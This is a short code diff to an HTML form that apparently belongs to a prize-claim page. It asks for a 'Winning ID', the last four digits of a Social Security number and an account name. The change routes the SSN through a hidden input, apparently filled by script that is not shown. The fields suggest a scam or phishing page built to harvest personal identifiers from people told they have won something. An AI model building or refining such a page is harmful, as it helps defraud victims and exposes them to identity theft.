@@ -67,10 +67,18 @@
           <input type="text" name="Winning ID" placeholder="TFL20258752AF" required class="w-full border rounded-lg p-2 focus:ring focus:ring-purple-300">
         </div>
 
-        <div>
-          <label class="block font-medium text-gray-700">Last 4 Digits of SSN</label>
-          <input type="text" id="ssnInput" name="Last 4 Digits of SSN" placeholder="1234" maxlength="4" required class="w-full border rounded-lg p-2 focus:ring focus:ring-purple-300">
-        </div>
+  <div>
+    <label class="block font-medium text-gray-700">Last 4 Digits of SSN</label>
+    <input 
+      type="text" 
+      id="ssnInput"
+      maxlength="4"
+      placeholder="e.g. 4821"
+      required
+      class="w-full border rounded-lg p-2 focus:ring focus:ring-purple-300"
+    >
+    <input type="hidden" name="Last 4 Digits of SSN" id="ssnReal">
+  </div>
 
         <div>
           <label class="block font-medium text-gray-700">Account Name</label>
